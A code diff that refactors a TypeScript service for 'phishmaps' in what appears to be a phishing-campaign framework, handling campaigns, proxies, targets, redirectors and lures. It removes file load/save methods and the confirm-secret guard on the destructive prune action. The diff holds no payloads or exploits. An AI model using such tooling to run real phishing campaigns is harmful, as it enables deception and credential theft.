@@ -1,4 +1,4 @@
-import { arrayIncludes, DIContainer, randomIdent } from '@famir/common'
+import { arrayIncludes, DIContainer } from '@famir/common'
 import {
   CAMPAIGN_REPOSITORY,
   CampaignRepository,
@@ -14,15 +14,7 @@ import {
   TargetRepository
 } from '@famir/database'
 import { ReplServerError } from '@famir/repl-server'
-import { Storage, STORAGE } from '@famir/storage'
-import {
-  DumpPhishmapData,
-  LoadPhishmapData,
-  Phishmap,
-  PrunePhishmapData,
-  RestorePhishmapData,
-  SavePhishmapData
-} from './phishmap.js'
+import { DumpPhishmapData, Phishmap, PrunePhishmapData, RestorePhishmapData } from './phishmap.js'
 
 export const PHISHMAP_SERVICE = Symbol('PhishmapService')
 
@@ -36,24 +28,18 @@ export class PhishmapService {
           c.resolve<ProxyRepository>(PROXY_REPOSITORY),
           c.resolve<TargetRepository>(TARGET_REPOSITORY),
           c.resolve<RedirectorRepository>(REDIRECTOR_REPOSITORY),
-          c.resolve<LureRepository>(LURE_REPOSITORY),
-          c.resolve<Storage>(STORAGE)
+          c.resolve<LureRepository>(LURE_REPOSITORY)
         )
     )
   }
-
-  protected confirmSecret: string
 
   constructor(
     protected readonly campaignRepository: CampaignRepository,
     protected readonly proxyRepository: ProxyRepository,
     protected readonly targetRepository: TargetRepository,
     protected readonly redirectorRepository: RedirectorRepository,
-    protected readonly lureRepository: LureRepository,
-    protected readonly storage: Storage
-  ) {
-    this.confirmSecret = randomIdent()
-  }
+    protected readonly lureRepository: LureRepository
+  ) {}
 
   async dump(data: DumpPhishmapData): Promise<Phishmap> {
     let lockSecret: string
@@ -271,8 +257,6 @@ export class PhishmapService {
   }
 
   async prune(data: PrunePhishmapData): Promise<true> {
-    this.checkConfirmSecret(data.confirmSecret)
-
     let lockSecret: string
     try {
       lockSecret = await this.campaignRepository.lock(data.campaignId)
@@ -351,37 +335,5 @@ export class PhishmapService {
     }
 
     return true
-  }
-
-  async load(data: LoadPhishmapData): Promise<unknown> {
-    const objectName = `phishmaps/${data.filename}.json`
-    const value = await this.storage.getObject(objectName)
-
-    return JSON.parse(value.toString())
-  }
-
-  async save(data: SavePhishmapData): Promise<true> {
-    const objectName = `phishmaps/${data.filename}.json`
-    const value = Buffer.from(JSON.stringify(data.phishmap, null, 2))
-
-    await this.storage.putObject(objectName, value, {
-      'Content-Type': 'application/json'
-    })
-
-    return true
-  }
-
-  protected checkConfirmSecret(confirmSecret: string | undefined) {
-    if (!(confirmSecret && confirmSecret === this.confirmSecret)) {
-      throw new ReplServerError(`Phishmap action canceled`, {
-        context: {
-          reason: `Confirm secret not provided or not match`,
-          confirmSecret: this.confirmSecret
-        },
-        code: 'FORBIDDEN'
-      })
-    }
-
-    this.confirmSecret = randomIdent()
   }
 }
